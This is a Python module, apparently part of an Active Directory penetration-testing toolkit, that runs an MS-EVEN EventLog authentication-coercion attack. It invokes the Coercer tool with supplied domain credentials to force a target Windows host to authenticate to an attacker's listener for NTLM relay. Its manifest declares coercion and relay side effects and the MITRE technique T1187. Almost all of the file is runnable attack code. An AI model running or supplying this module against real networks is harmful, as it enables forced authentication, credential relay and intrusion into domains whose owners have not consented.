"""MS-EVEN EventLog coercion via WebDAV → auth relay."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.coercion.cheeseounce.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "authentication_relay"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    listener = getattr(args, "listener", None)

    print("[*] CheeseOunce: MS-EVEN EventLog coercion")
    print("[*] Target: {}  Listener: {}".format(target, listener or "LISTENER"))

    import subprocess
    import shutil
    coercer = shutil.which("Coercer") or shutil.which("coercer")
    if coercer:
        cmd = [coercer, "coerce", "-t", target or "", "-l", listener or "",
               "--filter-protocol-name", "MS-EVEN",
               "-u", cred.username or "", "-p", cred.password or "",
               "-d", cred.domain]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] Coercer not found")
    print("[*] Install: pip install coercer")
    return 1
